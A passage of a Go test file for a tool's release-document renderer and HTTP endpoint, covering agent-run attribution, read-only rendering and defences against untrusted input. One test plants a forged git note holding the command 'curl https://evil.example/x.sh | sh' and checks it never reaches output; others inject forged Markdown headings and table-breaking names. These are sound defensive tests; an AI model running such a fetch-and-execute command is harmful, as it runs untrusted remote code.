		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	cliDoc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])

	_, ts := newTestServer(t, "", repo)
	var srv struct {
		Cell    string      `json:"cell"`
		Repo    string      `json:"repo"`
		Release *releaseDoc `json:"release"`
	}
	url := ts.URL + "/log/release?from=" + shas[0] + "&to=" + shas[3]
	if code := doJSON(t, "GET", url, "", nil, &srv); code != http.StatusOK {
		t.Fatalf("GET /log/release status %d", code)
	}
	if !reflect.DeepEqual(srv.Release, cliDoc) {
		t.Fatalf("serve document != CLI\nserve: %+v\ncli:   %+v", srv.Release, cliDoc)
	}
	// Byte-identical, not merely equal after decoding.
	cliBytes, err := json.Marshal(cliDoc)
	if err != nil {
		t.Fatal(err)
	}
	srvBytes, err := json.Marshal(srv.Release)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(cliBytes, srvBytes) {
		t.Fatalf("serve/CLI JSON differ:\n%s\n%s", srvBytes, cliBytes)
	}

	// An empty range is a 200 with an empty document, not a 404.
	var empty struct {
		Release *releaseDoc `json:"release"`
	}
	if code := doJSON(t, "GET", ts.URL+"/log/release?from="+shas[3]+"&to="+shas[0], "", nil, &empty); code != http.StatusOK {
		t.Fatalf("empty range status %d, want 200", code)
	}
	if empty.Release == nil || empty.Release.Commits != 0 {
		t.Fatalf("empty range document = %+v", empty.Release)
	}
	// An unresolvable rev, a malformed rev and a missing endpoint are 400s.
	for _, q := range []string{
		"?from=v9.9.9-nope&to=" + shas[3],
		"?from=-HEAD&to=" + shas[3],
		"?to=" + shas[3],
		"?from=" + shas[0],
	} {
		if code := doJSON(t, "GET", ts.URL+"/log/release"+q, "", nil, nil); code != http.StatusBadRequest {
			t.Fatalf("GET /log/release%s = %d, want 400", q, code)
		}
	}
}

func TestReleaseServeRequiresCellWithTwoCells(t *testing.T) {
	_, repoA, shasA := releaseRepo(t)
	_, repoB, _ := releaseRepo(t)
	s, ts := newTestServer(t, "", repoA, repoB)

	if code := doJSON(t, "GET", ts.URL+"/log/release?from="+shasA[0]+"&to="+shasA[3], "", nil, nil); code != http.StatusBadRequest {
		t.Fatalf("omitting cell with two cells = %d, want 400", code)
	}
	var out struct {
		Cell    string      `json:"cell"`
		Release *releaseDoc `json:"release"`
	}
	url := ts.URL + "/log/release?cell=" + s.cells[0].cell.ID() + "&from=" + shasA[0] + "&to=" + shasA[3]
	if code := doJSON(t, "GET", url, "", nil, &out); code != http.StatusOK {
		t.Fatalf("naming the cell = %d, want 200", code)
	}
	if out.Cell != s.cells[0].cell.ID() || out.Release.Commits != 3 {
		t.Fatalf("cell-scoped document = %+v", out)
	}
	if code := doJSON(t, "GET", ts.URL+"/log/release?cell=nope&from="+shasA[0]+"&to="+shasA[3], "", nil, nil); code != http.StatusBadRequest {
		t.Fatalf("unknown cell = %d, want 400", code)
	}
}

// --- AC #13: a torn run dir is counted, and everything else still renders ---

func TestReleaseIncompleteRunCounted(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	good := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, good, runReport{
		RunID: good, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	torn := filepath.Join(runsDir, releaseRunID(releaseDay(2), "bbbb"))
	if err := os.MkdirAll(torn, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(torn, "report.json"), []byte("{ half-written"), 0o644); err != nil {
		t.Fatal(err)
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if doc.Incomplete != 1 {
		t.Fatalf("incomplete = %d, want 1", doc.Incomplete)
	}
	if len(doc.Landings) != 1 || doc.Landings[0].RunID != good {
		t.Fatalf("the readable run stopped rendering: %+v", doc.Landings)
	}
	if !strings.Contains(releaseMarkdown(t, repo, shas[0]+".."+shas[3]), "unreadable") {
		t.Fatal("markdown footer does not disclose the unreadable run dir")
	}
}

// --- AC #14: the read-only claim, asserted mechanically ---

func TestReleaseWritesNothing(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	id := releaseRunID(releaseDay(2), "aaaa")
	rep := runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	}
	writeLogRun(t, runsDir, id, rep)
	data, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[3], data); err != nil {
		t.Fatal(err)
	}
	writeReleasePark(t, filepath.Join(runsDir, id), time.Now().Add(-2*time.Hour))

	refsBefore := allRefs(t, repo)
	runsBefore := treeSnapshot(t, runsDir)

	if _, raw := releaseJSON(t, repo, shas[0]+".."+shas[3]); raw == "" {
		t.Fatal("no document rendered")
	}

	if after := allRefs(t, repo); !reflect.DeepEqual(after, refsBefore) {
		t.Fatalf("refs changed across a read-only render:\nbefore %v\nafter  %v", refsBefore, after)
	}
	if after := treeSnapshot(t, runsDir); !reflect.DeepEqual(after, runsBefore) {
		t.Fatalf("run dir changed across a read-only render:\nbefore %v\nafter  %v", runsBefore, after)
	}
}

// allRefs maps every ref (including refs/notes/sigbound) to its OID.
func allRefs(t *testing.T, repo string) map[string]string {
	t.Helper()
	out, err := exec.Command("git", "-C", repo, "for-each-ref", "--format=%(refname) %(objectname)").Output()
	if err != nil {
		t.Fatal(err)
	}
	refs := map[string]string{}
	for _, line := range strings.Split(strings.TrimSpace(string(out)), "\n") {
		if name, oid, ok := strings.Cut(line, " "); ok {
			refs[name] = oid
		}
	}
	return refs
}

// treeSnapshot maps every file under root to its size and modification time —
// enough to catch a rewrite, a truncation, or a new file appearing.
func treeSnapshot(t *testing.T, root string) map[string]string {
	t.Helper()
	snap := map[string]string{}
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		info, err := d.Info()
		if err != nil {
			return err
		}
		snap[path] = fmt.Sprintf("%d@%s", info.Size(), info.ModTime().UTC().Format(time.RFC3339Nano))
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
	return snap
}

func readFileOrFail(t *testing.T, path string) []byte {
	t.Helper()
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return data
}

// --- selection frame: attention items are windowed, landings are not ---

// TestReleaseAttentionItemsAreWindowed pins the documented approximation: a
// parked run OUTSIDE the endpoints' committer-date window is not an attention
// item of this range, while a landing is selected by reachability and is
// unaffected by where its run dir's timestamp falls.
func TestReleaseAttentionItemsAreWindowed(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	// A flagged run a year after the range's last commit.
	outside := releaseRunID(releaseDay(400), "zzzz")
	writeLogRun(t, runsDir, outside, runReport{
		RunID: outside, BaseSHA: shas[1], StartedAt: releaseDay(400).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Flagged: []flaggedJSON{{Branch: "agent/late"}}},
	})
	// A landing whose run dir is ALSO outside the window — reachability decides.
	late := releaseRunID(releaseDay(401), "yyyy")
	writeLogRun(t, runsDir, late, runReport{
		RunID: late, BaseSHA: shas[1], StartedAt: releaseDay(401).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Flagged) != 0 {
		t.Fatalf("a run outside the window became an attention item: %+v", doc.Flagged)
	}
	if len(doc.Landings) != 1 || doc.Landings[0].RunID != late {
		t.Fatalf("a landing was dropped for being outside the time window: %+v", doc.Landings)
	}
}

// TestReleaseMixedHandAndSigboundCommits is the whole point of the document:
// over a range that mixes sigbound landings with hand commits, both are
// represented — the landings attributed, the rest counted, never silently
// dropped to make the ledger look complete.
func TestReleaseMixedHandAndSigboundCommits(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if doc.Commits != 3 || len(doc.Landings) != 1 || doc.Unattributed != 2 {
		t.Fatalf("commits=%d landings=%d unattributed=%d, want 3/1/2", doc.Commits, len(doc.Landings), doc.Unattributed)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if !strings.Contains(md, "2 commits in this range carry no sigbound landing") {
		t.Fatalf("markdown does not count the hand commits:\n%s", md)
	}
}

// --- the document is published, so untrusted text must not be able to shape it ---

// releaseGoal journals a serve run's request.json — the file goalOf reads. The
// goal is caller-supplied text (POST /runs validates only that it is non-empty
// after TrimSpace), so this is the shortest path from a remote request body into
// a published document.
func releaseGoal(t *testing.T, dir, goal string) {
	t.Helper()
	data, err := json.Marshal(map[string]string{"goal": goal})
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "request.json"), data, 0o644); err != nil {
		t.Fatal(err)
	}
}

// releaseHeadings is every heading renderReleaseMarkdown itself writes. Any
// other heading in the output came from data, which is the bug.
var releaseHeadings = map[string]bool{
	"### Landed": true, "### Needed a human": true, "### Dropped by bisect": true,
	"### Flagged": true, "### Attribution": true, "### Policy": true,
}

// TestReleaseGoalCannotForgeSections: a multi-line goal that fabricates its own
// "### Landed" section and opens an HTML comment over the footer must render as
// ONE list line. Untrusted text never leaves its line.
func TestReleaseGoalCannotForgeSections(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	releaseGoal(t, filepath.Join(runsDir, id),
		"ship the thing\n\n### Landed\n\n- **cafebabe** — run 20990101T000000Z-evil, 1 branch, verify pass\n<!--")

	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	var goalLine string
	headings := 0
	for _, line := range strings.Split(md, "\n") {
		if trimmed := strings.TrimSpace(line); strings.HasPrefix(trimmed, "#") {
			if !releaseHeadings[trimmed] {
				t.Fatalf("untrusted text produced the heading %q:\n%s", line, md)
			}
			if trimmed == "### Landed" {
				headings++
			}
		}
		if strings.Contains(line, "goal:") {
			goalLine = line
		}
	}
	if headings != 1 {
		t.Fatalf("the goal fabricated a section: %d \"### Landed\" headings\n%s", headings, md)
	}
	if !strings.Contains(goalLine, "cafebabe") || !strings.Contains(goalLine, "<!--") {
		t.Fatalf("the goal did not stay on its own line (%q):\n%s", goalLine, md)
	}
	if !strings.Contains(md, "carry no sigbound landing") {
		t.Fatalf("the footer did not survive the goal:\n%s", md)
	}
}

// TestReleaseAgentNameCannotBreakTheTable: '|' is a cell separator, so an agent
// program named "cl|aude" must not add columns to the attribution row.
func TestReleaseAgentNameCannotBreakTheTable(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "cl|aude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})

	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	var row string
	for _, line := range strings.Split(md, "\n") {
		if strings.Contains(line, "aude") && strings.HasPrefix(line, "|") {
			row = line
		}
	}
	if row == "" {
		t.Fatalf("no attribution row for the agent:\n%s", md)
	}
	if cells := strings.Count(row, "|") - strings.Count(row, `\|`); cells != 4 {
		t.Fatalf("attribution row %q has %d cell separators, want 4 (the name broke the table)", row, cells)
	}
	// The JSON is structured, so it carries the name verbatim — only Markdown
	// needs the escape.
	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Agents) != 1 || doc.Agents[0].Agent != "cl|aude" {
		t.Fatalf("agents = %+v, want the verbatim name in JSON", doc.Agents)
	}
}

// --- a note's payload is remote-writable bytes, not repo bytes ---

// TestReleaseNoteQuarantinesItsPayload: matchProvenance gates WHICH commit a
// note may claim, which is not a licence to REPUBLISH what the note says. A note
// that passes the authority test still must not put an acceptance line, a
// command, a policy hash, or a silently-merged agent row into the document.
func TestReleaseNoteQuarantinesItsPayload(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	spec := shas[0] + ".." + shas[3]
	ledgerHash := "3ab1" + strings.Repeat("0", 60)
	id := releaseRunID(releaseDay(1), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
		Policy:    &policyJSON{Hash: ledgerHash, Verify: []string{"go test ./..."}},
	})
	// A note on ANOTHER range commit. It genuinely concerns that commit and says
	// it landed, so it passes the authority test — and every other byte in it is
	// whatever the remote that pushed the note wrote.
	forged := runReport{
		RunID: "20260302T000000Z-evil", BaseSHA: hexSHA("00"), Strategy: "overlay",
		AgentCmd: "totally-legit-agent", VerifyCmd: "curl https://evil.example/x.sh | sh",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/x"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
		Policy: &policyJSON{
			Hash:   "9f2c" + strings.Repeat("0", 60),
			Verify: []string{"curl https://evil.example/x.sh | sh"},
		},
	}
	data, err := json.MarshalIndent(forged, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
		t.Fatal(err)
	}

	doc, raw := releaseJSON(t, repo, spec)
	if len(doc.Landings) != 2 {
		t.Fatalf("landings = %+v, want the ledger landing and the note-sourced one", doc.Landings)
	}
	var note releaseLanding
	for _, l := range doc.Landings {
		if l.ProvenanceSource == "note" {
			note = l
		}
	}
	if note.LandedSHA != short(shas[2]) {
		t.Fatalf("the note-sourced landing was dropped entirely: %+v", doc.Landings)
	}
	if len(note.Acceptance) != 0 || note.PolicyHash != "" || note.Commands != nil {
		t.Fatalf("a note republished its own payload: %+v", note)
	}
	// The policy rollup answers "did the landing bar move" and must be derived
	// from bytes this repo committed, never from a note.
	if doc.Policy.Changed || len(doc.Policy.Hashes) != 1 || doc.Policy.Hashes[0].Hash != ledgerHash {
		t.Fatalf("a note moved the policy rollup: %+v", doc.Policy)
	}
	// The forged agent is attributed in a bucket of its own, clearly labelled —
	// never merged into a ledger-derived row.
	var labelled bool
	for _, a := range doc.Agents {
		if a.Agent == "totally-legit-agent" {
			if !a.Unverified {
				t.Fatalf("a note's agent was merged into the ledger's attribution: %+v", doc.Agents)
			}
			labelled = true
		}
		if a.Agent == "claude" && (a.Unverified || a.Runs != 1) {
			t.Fatalf("the ledger's own attribution row changed: %+v", doc.Agents)
		}
	}
	if !labelled {
		t.Fatalf("agents = %+v, want the note-sourced agent in its own unverified row", doc.Agents)
	}
	if md := releaseMarkdown(t, repo, spec); !strings.Contains(md, "unverified") {
		t.Fatalf("the attribution table does not label the note-sourced row:\n%s", md)
	}
	outs := []string{raw, releaseMarkdown(t, repo, spec), releaseMarkdown(t, repo, spec, "-with-commands")}
	if _, withRaw := releaseJSON(t, repo, spec, "-with-commands"); true {
		outs = append(outs, withRaw)
	}
	for _, out := range outs {
		if strings.Contains(out, "evil.example") {
			t.Fatalf("a note's payload reached the published document:\n%s", out)
		}
	}
}

// --- the incomplete counter has to mean what the footer says ---

// TestReleaseTornRunDirOutsideWindowIsCounted: landings are selected by
// reachability, unwindowed, so a torn run dir outside the committer-date window
// can still be the missing half of a range commit's attribution. Counting it
// only inside the window let the footer claim "ledger and note are both gone"
// about a ledger that is right there, merely unreadable.
func TestReleaseTornRunDirOutsideWindowIsCounted(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	torn := filepath.Join(runsDir, releaseRunID(releaseDay(400), "bbbb"))
	if err := os.MkdirAll(torn, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(torn, "report.json"), []byte("{ half-written"), 0o644); err != nil {
		t.Fatal(err)
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if doc.Incomplete != 1 {
		t.Fatalf("incomplete = %d, want 1: a torn dir outside the window is still a run this document could not read", doc.Incomplete)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if strings.Contains(md, "ledger and note are both gone") {
		t.Fatalf("the footer claims the ledger is gone while a run dir is merely unreadable:\n%s", md)
	}
	if !strings.Contains(md, "unreadable") {
		t.Fatalf("the footer hides the unreadable run dir:\n%s", md)
	}
}

// --- one landing, one row, whatever the note omits ---

// TestReleaseNotesWithoutRunIDCountOnceEach: dedupe keyed on runId alone
// double-counted a hand-written or legacy note that omits it. The landed sha is
// the fallback identity, so two notes describing the SAME landing are one row —
// and a note describing a DIFFERENT landing is still its own row, which is the
// half a blanket "no runId, no second row" rule would silently swallow.
func TestReleaseNotesWithoutRunIDCountOnceEach(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	ctx := context.Background()
	// Landing A: its integration commit AND its landed member tip are both in
	// range, so BOTH carry a note describing it.
	a := runReport{ // no runId at all
		BaseSHA: shas[0], StartedAt: releaseDay(2).Format(time.RFC3339), Strategy: "overlay", AgentCmd: "claude -p",
		PerAgent:  []perAgentJSON{{ID: "t1", Branch: "agent/t1", SHA: shas[3], OK: true}},
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	}
	// Landing B: a different run, also without a runId.
	b := runReport{
		BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), Strategy: "overlay", AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t9"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
	}
	for _, n := range []struct {
		sha string
		rep runReport
	}{{shas[2], a}, {shas[3], a}, {shas[1], b}} {
		data, err := json.MarshalIndent(n.rep, "", "  ")
		if err != nil {
			t.Fatal(err)
		}
		if err := g.NoteAdd(ctx, "sigbound", n.sha, data); err != nil {
			t.Fatal(err)
		}
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 2 {
		t.Fatalf("landings = %d, want 2 — three notes, two landings: %+v", len(doc.Landings), doc.Landings)
	}
	landed := map[string]int{}
	for _, l := range doc.Landings {
		landed[l.LandedSHA]++
	}
	if landed[short(shas[2])] != 1 || landed[short(shas[1])] != 1 {
		t.Fatalf("landings = %+v, want each landing exactly once", doc.Landings)
	}
	if doc.Unattributed != 0 {
		t.Fatalf("unattributed = %d, want 0: all three noted commits are claimed", doc.Unattributed)
	}
	if len(doc.Agents) != 1 || doc.Agents[0].Runs != 2 || doc.Agents[0].Landed != 2 {
		t.Fatalf("agents = %+v, want the two runs counted once each", doc.Agents)
	}
}

// --- the guards the renderer/selector already carry, pinned ---

// TestReleaseVerifyNoneIsRendered: a run with no -verify configured still lands
// (landed() accepts an unset verify), and the document must SAY the verdict was
// none rather than implying a green landing.
func TestReleaseVerifyNoneIsRendered(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[2]},
		// Verify deliberately zero: never ran.
	})

	doc, raw := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 1 || doc.Landings[0].Verify != "none" {
		t.Fatalf("verify = %+v, want the landing rendered with verdict none", doc.Landings)
	}
	if !strings.Contains(raw, `"verify": "none"`) {
		t.Fatalf("-json does not carry the none verdict:\n%s", raw)
	}
	if md := releaseMarkdown(t, repo, shas[0]+".."+shas[3]); !strings.Contains(md, "verify none") {
		t.Fatalf("markdown does not carry the none verdict:\n%s", md)
	}
}

// TestReleaseNoteThatDidNotLandAttributesNothing: a note that genuinely concerns
// a range commit but records it as FLAGGED, not landed, is not a landing. The
// authority test answers; `landed` is the second, independent gate.
func TestReleaseNoteThatDidNotLandAttributesNothing(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	ctx := context.Background()
	rep := runReport{
		RunID: "20260302T000000Z-note", BaseSHA: shas[0], Strategy: "overlay", AgentCmd: "claude",
		PerAgent: []perAgentJSON{{ID: "x", Branch: "agent/x", SHA: shas[2], OK: true}},
		Integrate: integrateJSON{
			Strategy: "overlay", Landed: []string{"agent/other"},
			Flagged: []flaggedJSON{{Branch: "agent/x"}}, FinalSHA: shas[1],
		},
		Verify: verifyJSON{Ran: true, OK: true},
	}
	data, err := json.MarshalIndent(rep, "", "  ")
	if err != nil {
		t.Fatal(err)
	}
	if err := g.NoteAdd(ctx, "sigbound", shas[2], data); err != nil {
		t.Fatal(err)
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 0 {
		t.Fatalf("a flagged member became a landing: %+v", doc.Landings)
	}
	if doc.Unattributed != doc.Commits {
		t.Fatalf("unattributed = %d, want %d — nothing landed here", doc.Unattributed, doc.Commits)
	}
}

// TestReleaseNoteDoesNotDoubleClaimALedgerRun: the ledger already rendered run
// R, by run id AND by landed sha. Notes naming R either way add no second
// landing row and no second run to the attribution table — and, because the
// ledger is the ground truth for its OWN landing, they cannot extend that
// landing's claim either: a commit the local report does not record as landed
// stays counted `unattributed` rather than being absorbed into a row that never
// mentions it.
func TestReleaseNoteDoesNotDoubleClaimALedgerRun(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	id := releaseRunID(releaseDay(1), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"agent/t1"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	// The note's copy of the same run knows a member tip the ledger's copy does not.
	noteRep := runReport{
		RunID: id, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude -p",
		PerAgent: []perAgentJSON{{ID: "t2", Branch: "agent/t2", SHA: shas[2], OK: true}},
		Integrate: integrateJSON{
			Strategy: "overlay", Landed: []string{"agent/t1", "agent/t2"}, FinalSHA: shas[1],
		},
		Verify: verifyJSON{Ran: true, OK: true},
	}
	// A legacy copy of the same landing, on a third commit, carrying NO runId —
	// it names the run only by its landed sha, which is just as public.
	legacy := noteRep
	legacy.RunID = ""
	legacy.PerAgent = []perAgentJSON{{ID: "t3", Branch: "agent/t3", SHA: shas[3], OK: true}}
	legacy.Integrate.Landed = []string{"agent/t1", "agent/t3"}
	for _, n := range []struct {
		sha string
		rep runReport
	}{{shas[2], noteRep}, {shas[3], legacy}} {
		data, err := json.MarshalIndent(n.rep, "", "  ")
		if err != nil {
			t.Fatal(err)
		}
		if err := g.NoteAdd(ctx, "sigbound", n.sha, data); err != nil {
			t.Fatal(err)
		}
	}

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 1 || doc.Landings[0].ProvenanceSource != "manifest" {
		t.Fatalf("landings = %+v, want the ledger row exactly once", doc.Landings)
	}
	if len(doc.Agents) != 1 || doc.Agents[0].Runs != 1 || doc.Agents[0].Unverified {
		t.Fatalf("agents = %+v, want the one ledger run counted once", doc.Agents)
	}
	if doc.Unattributed != 2 {
		t.Fatalf("unattributed = %d, want 2 — the ledger's landing landed neither noted commit, so neither may vanish", doc.Unattributed)
	}
}

// TestReleaseLandingsAreNewestFirst pins the order the docs promise, in both
// shapes.
func TestReleaseLandingsAreNewestFirst(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	older, newer := releaseRunID(releaseDay(1), "aaaa"), releaseRunID(releaseDay(2), "bbbb")
	writeLogRun(t, runsDir, older, runReport{
		RunID: older, BaseSHA: shas[0], StartedAt: releaseDay(1).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[1]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})
	writeLogRun(t, runsDir, newer, runReport{
		RunID: newer, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Landed: []string{"a"}, FinalSHA: shas[2]},
		Verify:    verifyJSON{Ran: true, OK: true},
	})

	doc, _ := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if len(doc.Landings) != 2 || doc.Landings[0].RunID != newer || doc.Landings[1].RunID != older {
		t.Fatalf("landings = %+v, want newest-first", doc.Landings)
	}
	md := releaseMarkdown(t, repo, shas[0]+".."+shas[3])
	if strings.Index(md, short(shas[2])) > strings.Index(md, short(shas[1])) {
		t.Fatalf("markdown renders the older landing first:\n%s", md)
	}
}

// TestReleaseServeRefusesRangeByGrammar: the endpoint applies parseReleaseRange's
// grammar to the two halves BEFORE git sees them, so a `from` that is itself a
// range is refused with the grammar's own message rather than a rev-parse
// diagnostic about an endpoint the caller never wrote.
func TestReleaseServeRefusesRangeByGrammar(t *testing.T) {
	_, repo, shas := releaseRepo(t)
	_, ts := newTestServer(t, "", repo)
	var body struct {
		Error string `json:"error"`
		Code  string `json:"code"`
	}
	url := ts.URL + "/log/release?from=" + shas[0] + ".." + shas[1] + "&to=" + shas[3]
	if code := doJSON(t, "GET", url, "", nil, &body); code != http.StatusBadRequest {
		t.Fatalf("GET /log/release with a range as `from` = %d, want 400", code)
	}
	if !strings.Contains(body.Error, "FROM..TO") {
		t.Fatalf("400 message %q does not name the grammar", body.Error)
	}
}

// TestReleaseInvertedWindowSaysSo: the attention window is framed on committer
// dates, so a range whose FROM commit is NEWER than its TO commit (a rebase, a
// cherry-pick, a skewed clock) has an empty window — no run start can fall
// inside it. Zero attention items would otherwise read as "nothing needed a
// human", which is a different claim entirely.
func TestReleaseInvertedWindowSaysSo(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	// A descendant of the last commit, dated BEFORE the first one.
	backdated := releaseCommit(t, repo, "late.txt", "x\n", releaseDay(0).Add(-time.Hour))
	writeLogRun(t, runsDir, releaseRunID(releaseDay(2), "aaaa"), runReport{
		BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339), AgentCmd: "claude",
		Integrate: integrateJSON{Strategy: "overlay", Flagged: []flaggedJSON{{Branch: "agent/x"}}},
	})

	doc, _ := releaseJSON(t, repo, shas[3]+".."+backdated)
	if doc.Commits != 1 {
		t.Fatalf("commits = %d, want the one backdated commit", doc.Commits)
	}
	if !doc.Window.Inverted {
		t.Fatalf("window = %+v, want it marked inverted", doc.Window)
	}
	if len(doc.Flagged) != 0 {
		t.Fatalf("an inverted window selected attention items: %+v", doc.Flagged)
	}
	if md := releaseMarkdown(t, repo, shas[3]+".."+backdated); !strings.Contains(md, "INVERTED") {
		t.Fatalf("markdown hides the inverted window:\n%s", md)
	}
	// A normal range says nothing about inversion, in either shape.
	fwd, fwdRaw := releaseJSON(t, repo, shas[0]+".."+shas[3])
	if fwd.Window.Inverted || strings.Contains(fwdRaw, "inverted") {
		t.Fatalf("a forward range claims an inverted window: %s", fwdRaw)
	}
}

// TestReleaseJSONShapeIsGolden pins the -json document byte for byte over a
// fixed fixture — key names, key ORDER, nesting and omissions — so "stable and
// documented" is enforced mechanically instead of by spot-checking that a few
// keys exist. Commit shas are the only thing substituted (they depend on the
// machine's clock through the author date).
func TestReleaseJSONShapeIsGolden(t *testing.T) {
	g, repo, shas := releaseRepo(t)
	runsDir := logRunsDir(t, g)
	ctx := context.Background()
	id := releaseRunID(releaseDay(2), "aaaa")
	writeLogRun(t, runsDir, id, runReport{
		RunID: id, BaseSHA: shas[1], StartedAt: releaseDay(2).Format(time.RFC3339),
